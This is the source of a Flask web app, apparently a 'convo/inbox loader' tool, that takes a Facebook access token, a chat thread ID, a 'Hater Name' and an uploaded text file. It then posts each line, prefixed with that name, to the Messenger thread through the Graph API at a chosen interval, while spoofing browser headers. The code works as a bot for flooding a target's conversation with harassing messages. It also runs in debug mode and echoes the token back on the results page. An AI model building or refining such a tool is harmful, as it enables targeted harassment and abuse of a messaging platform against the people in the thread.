from flask import Flask, request, render_template_string
import requests
import time

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        results = []
        for message1 in messages:
            try:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    results.append(f"Message sent using token {access_token}: {message}")
                else:
                    results.append(f"Failed to send message using token {access_token}: {message}")
                time.sleep(time_interval)
            except Exception as e:
                results.append(f"Error while sending message using token {access_token}: {message}")
                results.append(str(e))
                time.sleep(30)

        return render_template_string('''
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>L0S3R BR9ND S3RV3R</title>
                <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
                <style>
                    body {
                        background-color: #f8f9fa;
                    }
                    .container {
                        max-width: 500px;
                        background-color: #fff;
                        border-radius: 10px;
                        padding: 20px;
                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                        margin: 0 auto;
                        margin-top: 20px;
                    }
                    .header {
                        text-align: center;
                        padding-bottom: 20px;
                    }
                    .btn-submit {
                        width: 100%;
                        margin-top: 10px;
                    }
                    .footer {
                        text-align: center;
                        margin-top: 20px;
                        color: #888;
                    }
                </style>
            </head>
            <body>
                <header class="header mt-4">
                    <h1 class="mb-3"> 𝙾𝙵𝙵𝙻𝙸𝙽𝙴 𝚂𝙴𝚁𝚅𝙴𝚁
                        BY
                        L0S3R BR9ND>3:)
                    </h1>
                    <h1 class="mt-3">🅾🆆🅽🅴🆁]|I{•------» L0S3R BR9ND</h1>
                </header>

                <div class="container">
                    <form action="/" method="post" enctype="multipart/form-data">
                        <div class="mb-3">
                            <label for="accessToken">Enter Your Token:</label>
                            <input type="text" class="form-control" id="accessToken" name="accessToken" required>
                        </div>
                        <div class="mb-3">
                            <label for="threadId">Enter Convo/Inbox ID:</label>
                            <input type="text" class="form-control" id="threadId" name="threadId" required>
                        </div>
                        <div class="mb-3">
                            <label for="kidx">Enter Hater Name:</label>
                            <input type="text" class="form-control" id="kidx" name="kidx" required>
                        </div>
                        <div class="mb-3">
                            <label for="txtFile">Select Your Notepad File:</label>
                            <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
                        </div>
                        <div class="mb-3">
                            <label for="time">Speed in Seconds:</label>
                            <input type="number" class="form-control" id="time" name="time" required>
                        </div>
                        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
                    </form>
                </div>
                <div class="container mt-4">
                    <h3>Results:</h3>
                    <ul>
                        {% for result in results %}
                            <li>{{ result }}</li>
                        {% endfor %}
                    </ul>
                </div>
                <footer class="footer">
                    <p>&copy; Developed by L0S3R BR9ND 2025. All Rights Reserved.</p>
                    <p>C0NV0/INB0X L09D3R T00L BY L0S3R BR9NDl</p>
                    <p>Keep enjoying <a href="https://github.com/L0S3RBR9ND">GitHub</a></p>
                </footer>
            </body>
            </html>
        ''', results=results)

    return '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>L0S3R BR9ND S3RV3R</title>
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
            <style>
                body {
                    background-color: #f8f9fa;
                }
                .container {
                    max-width: 500px;
                    background-color: #fff;
                    border-radius: 10px;
                    padding: 20px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    margin: 0 auto;
                    margin-top: 20px;
                }
                .header {
                    text-align: center;
                    padding-bottom: 20px;
                }
                .btn-submit {
                    width: 100%;
                    margin-top: 10px;
                }
                .footer {
                    text-align: center;
                    margin-top: 20px;
                    color: #888;
                }
            </style>
        </head>
        <body>
            <header class="header mt-4">
                <h1 class="mb-3"> 𝙾𝙵𝙵𝙻𝙸𝙽𝙴 𝚂𝙴𝚁𝚅𝙴𝚁
                    BY
                    L0S3R BR9ND >3:)
                </h1>
                <h1 class="mt-3">🅾🆆🅽🅴🆁]|I{•------» L0S3R BR9ND</h1>
            </header>

            <div class="container">
                <form action="/" method="post" enctype="multipart/form-data">
                    <div class="mb-3">
                        <label for="accessToken">Enter Your Token:</label>
                        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
                    </div>
                    <div class="mb-3">
                        <label for="threadId">Enter Convo/Inbox ID:</label>
                        <input type="text" class="form-control" id="threadId" name="threadId" required>
                    </div>
                    <div class="mb-3">
                        <label for="kidx">Enter Hater Name:</label>
                        <input type="text" class="form-control" id="kidx" name="kidx" required>
                    </div>
                    <div class="mb-3">
                        <label for="txtFile">Select Your Notepad File:</label>
                        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
                    </div>
                    <div class="mb-3">
                        <label for="time">Speed in Seconds:</label>
                        <input type="number" class="form-control" id="time" name="time" required>
                    </div>
                    <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
                </form>
            </div>
            <footer class="footer">
                <p>&copy; Developed by L0S3R BR9ND 2025. All Rights Reserved.</p>
                <p>C0NV0/INB0X LOADER BY L0S3R BR9ND</p>
                <p>Keep enjoying <a href="https://github.com/L0S3RBR9ND">GitHub</a></p>
            </footer>
        </body>
        </html>
    '''

if __name__ == '__main__':
    app.run(debug=True)
